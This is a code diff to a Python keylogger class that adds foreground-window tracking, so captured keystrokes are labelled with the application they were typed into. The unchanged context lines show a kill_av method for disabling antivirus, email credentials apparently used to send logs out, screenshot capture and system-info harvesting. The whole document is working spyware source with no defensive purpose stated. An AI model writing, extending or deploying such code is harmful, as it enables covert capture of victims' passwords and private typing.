@@ -19,7 +19,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication 
 from os.path import basename    
 #==============================================================
-
+import win32gui as w   # Used to Get The Active Window Name
 
 class Keylogger:
     def __init__(self, time_interval, email, password):
@@ -29,6 +29,7 @@ class Keylogger:
         self.password = password
         self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
         self.system_info = self.get_system_info()
+        self.lastWindow = ""   #Used to Distinguish Log Data
 
     def kill_av(self):
         try:
@@ -63,95 +64,102 @@ class Keylogger:
         return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user
 
     def process_key_press(self, key):
+        current_key = ""
+        CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())
+        
+        if self.lastWindow != CurrentWindowName:
+            self.lastWindow = CurrentWindowName
+            current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
+            
         try:
-            current_key = str(key.char)
+            current_key += str(key.char)
         except AttributeError:
             if key == key.space:
-                current_key = " "
+                current_key += " "
                 
             elif key == key.enter:
-                current_key = " [ENTER] " 
+                current_key += " [ENTER] " 
 
             elif key == key.backspace:
-                current_key = " [BACKSPACE] " 
+                current_key += " [BACKSPACE] " 
 
             elif key == key.ctrl_l or key == key.ctrl_r:
-                current_key = " [CTRL] " 
+                current_key += " [CTRL] " 
 
             elif key == key.shift or key == key.shift_r:
-                current_key = " [SHIFT] " 
+                current_key += " [SHIFT] " 
 
             elif key == key.delete:
-                current_key = " [DELETE] " 
+                current_key += " [DELETE] " 
 
             elif key == key.esc:
-                current_key = " [ESC] " 
+                current_key += " [ESC] " 
 
             elif key == key.tab:
-                current_key = " [TAB] "   
+                current_key += " [TAB] "   
 
             elif key == key.up:
-                current_key = " [UP] " 
+                current_key += " [UP] " 
 
             elif key == key.down:
-                current_key = " [DOWN] " 
+                current_key += " [DOWN] " 
 
             elif key == key.left:
-                current_key = " [LEFT] " 
+                current_key += " [LEFT] " 
 
             elif key == key.right:
-                current_key = " [RIGHT] " 
+                current_key += " [RIGHT] " 
                 
             elif key == key.cmd or key == key.cmd_r:
-                current_key = " [WINDOWS-KEY] " 
+                current_key += " [WINDOWS-KEY] " 
 
             elif key == key.f1:
-                current_key = " [F1] "  
+                current_key += " [F1] "  
 
             elif key == key.f2:
-                current_key = " [F2] " 
+                current_key += " [F2] " 
 
             elif key == key.f3:
-                current_key = " [F3] "                 
+                current_key += " [F3] "                 
                 
             elif key == key.f4:
-                current_key = " [F4] " 
+                current_key += " [F4] " 
 
             elif key == key.f5:
-                current_key = " [F5] "  
+                current_key += " [F5] "  
 
             elif key == key.f6:
-                current_key = " [F6] " 
+                current_key += " [F6] " 
 
             elif key == key.f7:
-                current_key = " [F7] " 
+                current_key += " [F7] " 
                 
             elif key == key.f8:
-                current_key = " [F8] " 
+                current_key += " [F8] " 
 
             elif key == key.f9:
-                current_key = " [F9] "                 
+                current_key += " [F9] "                 
                 
             elif key == key.f10:
-                current_key = " [F10] " 
+                current_key += " [F10] " 
 
             elif key == key.f11:
-                current_key = " [F11] "  
+                current_key += " [F11] "  
 
             elif key == key.f12:
-                current_key = " [F12] " 
+                current_key += " [F12] " 
 
             elif key == key.alt_l or key == key.alt_r:
-                current_key = " [ALT] "  
+                current_key += " [ALT] "  
 
             elif key == key.caps_lock:
-                current_key = " [CAPSLOCK] " 
+                current_key += " [CAPSLOCK] " 
                 
             elif key == key.home:
-                current_key = " [HOME] "                 
+                current_key += " [HOME] "                 
                 
             else:
-                current_key = " " + str(key) + " "
+                current_key += " " + str(key) + " "
         self.append_to_log(current_key)
 
     def report(self):        
